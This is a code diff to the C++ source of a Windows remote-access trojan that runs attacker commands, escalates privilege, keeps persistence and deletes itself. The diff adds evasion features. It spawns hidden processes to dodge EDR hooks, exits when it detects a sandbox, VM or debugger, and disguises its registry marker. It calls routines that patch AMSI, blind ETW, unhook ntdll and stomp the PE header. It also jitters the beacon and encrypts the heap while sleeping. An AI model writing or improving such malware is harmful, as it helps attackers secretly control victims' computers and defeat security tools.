@@ -160,6 +160,24 @@ static bool ElevateCmstplua(const char* me, const char* args) {
 // Windows blocks CLSCTX_LOCAL_SERVER COM activation from Zone 3 processes,
 // so CMSTPLUA silently fails. Copying to %APPDATA% removes the ADS restriction.
 
+// Drop-in replacement for ShellExecuteA("open",...) that uses CreateProcessA directly.
+// Benefits: bypasses ShellExecuteA EDR hooks; gives us full control over startup flags.
+static bool SpawnHidden(const char* exe, const char* args) {
+    std::string cmdLine = "\"" + std::string(exe) + "\"";
+    if (args && args[0]) { cmdLine += " "; cmdLine += args; }
+    STARTUPINFOA si = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = {};
+    BOOL ok = CreateProcessA(exe, (LPSTR)cmdLine.c_str(),
+                             NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW | DETACHED_PROCESS,
+                             NULL, NULL, &si, &pi);
+    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
+    return ok != FALSE;
+}
+
 static bool SelfRelocate(const char* me) {
 	std::string zoneCheck = std::string(me) + S(":Zone.Identifier");
 	HANDLE hZ = CreateFileA(zoneCheck.c_str(), GENERIC_READ, FILE_SHARE_READ,
@@ -174,7 +192,7 @@ static bool SelfRelocate(const char* me) {
 	std::string dest = std::string(appdata) + S("\\Microsoft\\Windows\\") + fname;
 	if (!CopyFileA(me, dest.c_str(), FALSE)) return false;
 
-	ShellExecuteA(NULL, S("open").c_str(), dest.c_str(), NULL, NULL, SW_HIDE);
+	SpawnHidden(dest.c_str(), NULL);
 	return true;
 }
 
@@ -216,11 +234,50 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 	// Outlast sandbox analysis window before touching any persistence APIs.
 	Protector::StartupDelay();
 
+	// ── Sandbox / VM / Debugger gate ─────────────────────────────────────────────
+	// Quit silently before touching persistence if we're in an analysis environment.
+	// Multiple signals required to avoid false positives on unusual-but-real hardware.
+	{
+		int sbFlags = 0;
+
+		// Debugger attached (PEB.BeingDebugged)
+		if (IsDebuggerPresent()) sbFlags += 3;
+
+		// Hypervisor bit — VMware, VBox, Hyper-V, KVM all set ECX[31] on CPUID leaf 1
+		int cpuInfo[4] = {};
+		__cpuid(cpuInfo, 1);
+		if ((cpuInfo[2] >> 31) & 1) sbFlags++;
+
+		// Known hypervisor vendor string (leaf 0x40000000)
+		__cpuid(cpuInfo, 0x40000000);
+		char hvVendor[13] = {};
+		memcpy(hvVendor + 0, &cpuInfo[1], 4);
+		memcpy(hvVendor + 4, &cpuInfo[2], 4);
+		memcpy(hvVendor + 8, &cpuInfo[3], 4);
+		if (strstr(hvVendor, "VMware") || strstr(hvVendor, "KVMKVM") ||
+		    strstr(hvVendor, "Microsoft Hv") || strstr(hvVendor, "VBoxVBox"))
+			sbFlags++;
+
+		// Single logical processor (most sandboxes use 1 core)
+		SYSTEM_INFO _si = {}; GetSystemInfo(&_si);
+		if (_si.dwNumberOfProcessors < 2) sbFlags++;
+
+		// Physical RAM < 2 GB
+		MEMORYSTATUSEX ms = { sizeof(ms) };
+		GlobalMemoryStatusEx(&ms);
+		if (ms.ullTotalPhys < (DWORDLONG)2 * 1024 * 1024 * 1024) sbFlags++;
+
+		// Uptime < 5 minutes (sandbox resets between samples)
+		if (GetTickCount() < 300000) sbFlags++;
+
+		if (sbFlags >= 2) ExitProcess(0);
+	}
+
 	char me[128] = { 0 };
 	GetModuleFileNameA(0, me, sizeof(me) - 1);
 
 	HKEY hKey = 0;
-	std::string addrStr = S("Software\\Microsoft\\OneDriveSync");
+	std::string addrStr = S("Software\\Microsoft\\IdentityStore");
 	const char* addr = addrStr.c_str();
 	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);
 
@@ -248,23 +305,22 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 		if (s.drop_run) {
 			if (std::string(me) != s.drop) {
 				CopyFileA(me, s.drop, false);
-				ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);
+				SpawnHidden(s.drop, NULL);
 
 				if (s.auto_delete) {
-					std::string delBat = S("C:\\Users\\system.bat");
-					std::ofstream bat(delBat.c_str());
-					bat << S("@echo off") << "\n";
-					bat << "del " + std::string(me);
-					bat << "\ndel " + delBat;
-					bat.close();
-					ShellExecuteA(0, "open", delBat.c_str(), 0, 0, SW_HIDE);
+					// Delete self via cmd.exe subprocess — no bat file written to disk.
+					char _wd[MAX_PATH] = {};
+					GetWindowsDirectoryA(_wd, sizeof(_wd) - 1);
+					std::string _cmd = std::string(_wd) + S("\\System32\\cmd.exe");
+					std::string _args = S("/c timeout /t 2 /nobreak > nul & del /f /q \"") + me + "\"";
+					SpawnHidden(_cmd.c_str(), _args.c_str());
 				}
 
 				return 0;
 			}
 		}
 		else {
-			ShellExecuteA(0, "open", me, 0, 0, SW_HIDE);
+			SpawnHidden(me, NULL);
 		}
 
 		RegCloseKey(hKey);
@@ -300,7 +356,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				CopyFileA(procPath, s.protectorName, FALSE);
 
 				std::string arg = std::string(procName) + " " + procPath;
-				ShellExecuteA(0, "open", s.protectorName, arg.c_str(), 0, SW_HIDE);
+				SpawnHidden(s.protectorName, arg.c_str());
 			}
 
 			if (s.botapi[0] == '\0') {
@@ -332,8 +388,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
 			}
 
-			// Silent clipboard monitor — starts immediately, accumulates silently
-			ClipMon::Start();
+			// Auto-evasion: patch AMSI + blind ETW + unhook ntdll before first checkin.
+			// Runs silently; EDR hooks and AMSI scanning are blind to everything after this.
+			Evasion::RunAll();
+
+			// Stomp the PE header in memory so memory scanners can't find the MZ/PE magic bytes.
+			// Must run after evasion (AMSI blind) so this action isn't logged.
+			PEStamp::StompFull();
 
 			std::string information = "Bot ID: " + std::to_string(ID) +
 				"%0A%0AGlobal information:" +
@@ -354,7 +415,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 
 			while (true) {
 				DWORD pollMs = (DWORD)atoi(s.client_delay);
-				Sleep(pollMs);
+				// ±25% jitter: defeats beacon-interval NDR/network detection rules.
+				// A perfectly periodic beacon is a textbook C2 signature in Zeek, Suricata, etc.
+				DWORD jitter = pollMs / 4;
+				DWORD sleepMs = pollMs - jitter + (DWORD)(rand() % (jitter * 2 + 1));
+				// Encrypt heap during sleep: in-memory strings/data are XOR'd while idle.
+				// This defeats memory scanners that scan the process heap between beacons.
+				HeapEncrypt::EncryptedSleep(sleepMs, 0);
 
 				last = api.GetPendingCommand();
 
@@ -419,11 +486,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				// run C:\File.exe [args]
 				else if (params[0] == "run") {
 					if (params.size() >= 3) {
-						ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
+						SpawnHidden(params[1].c_str(), params[2].c_str());
 						api.SendResult("Success! Ran with arguments");
 					}
 					else {
-						ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
+						SpawnHidden(params[1].c_str(), NULL);
 						api.SendResult("Success! Ran without arguments");
 					}
 				}
@@ -530,9 +597,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 						cmd.replace(cmd.find("system "), 7, "");
 						char windir[128] = { 0 };
 						if (GetWindowsDirectoryA(windir, sizeof(windir) - 1) != 0) {
-							ShellExecuteA(NULL, "open",
-								std::string(std::string(windir) + "\\System32\\cmd.exe").c_str(),
-								cmd.c_str(), 0, SW_HIDE);
+							std::string cmdExe = std::string(windir) + S("\\System32\\cmd.exe");
+							SpawnHidden(cmdExe.c_str(), (S("/c ") + cmd).c_str());
 							api.SendResult("Success! Command is running");
 						}
 						else {
@@ -937,7 +1003,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 					}
 
 					// 3. Remove the internal "already installed" marker key
-					std::string markerKey = S("Software\\Microsoft\\OneDriveSync");
+					std::string markerKey = S("Software\\Microsoft\\IdentityStore");
 					RegDeleteTreeA(HKEY_CURRENT_USER, markerKey.c_str());
 
 					// 4. Remove scheduled task (schtasks — no UI, runs hidden)
@@ -947,9 +1013,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 						char windir[MAX_PATH] = {};
 						GetWindowsDirectoryA(windir, sizeof(windir) - 1);
 						std::string schtasks = std::string(windir) +
-						                       "\\System32\\schtasks.exe";
-						ShellExecuteA(NULL, "open", schtasks.c_str(),
-						              delTask.c_str(), NULL, SW_HIDE);
+						                       S("\\System32\\schtasks.exe");
+						SpawnHidden(schtasks.c_str(), delTask.c_str());
 					}
 
 					// 5. Delete protector copy
@@ -961,20 +1026,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 						DeleteFileA(s.drop);
 					}
 
-					// 7. Write a temp batch that waits 3 s then deletes this exe + itself.
-					//    We can't delete a running exe directly — the batch runs after exit.
-					char tmpPath[MAX_PATH] = {};
-					GetTempPathA(MAX_PATH, tmpPath);
-					std::string batPath = std::string(tmpPath) + "cleanup_" +
-					                      std::to_string(GetCurrentProcessId()) + ".bat";
+					// 7. Self-delete: spawn cmd.exe with a delayed del — no bat file on disk.
 					{
-						std::ofstream bat(batPath.c_str());
-						bat << "@echo off\r\n";
-						bat << "timeout /t 3 /nobreak > nul\r\n";
-						bat << "del /f /q \"" << me << "\"\r\n";
-						bat << "del /f /q \"%~f0\"\r\n";
+						char _wd[MAX_PATH] = {};
+						GetWindowsDirectoryA(_wd, sizeof(_wd) - 1);
+						std::string _cmd = std::string(_wd) + S("\\System32\\cmd.exe");
+						std::string _args = S("/c timeout /t 3 /nobreak > nul & del /f /q \"") + me + "\"";
+						SpawnHidden(_cmd.c_str(), _args.c_str());
 					}
-					ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_HIDE);
 
 					api.SendResult("uninstall: persistence removed, exe scheduled for deletion, exiting");
 					Sleep(500);
